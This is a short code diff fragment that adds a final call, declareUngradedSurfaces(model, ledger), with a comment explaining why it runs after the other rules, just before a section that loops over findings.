+  // Runs LAST, on purpose: it declares what the rules above did not claim, so it must see the
+  // finished picture rather than race the rules for a subject.
+  declareUngradedSurfaces(model, ledger)
 
   // ---- law enforcement -----------------------------------------------------
   for (const f of findings) {
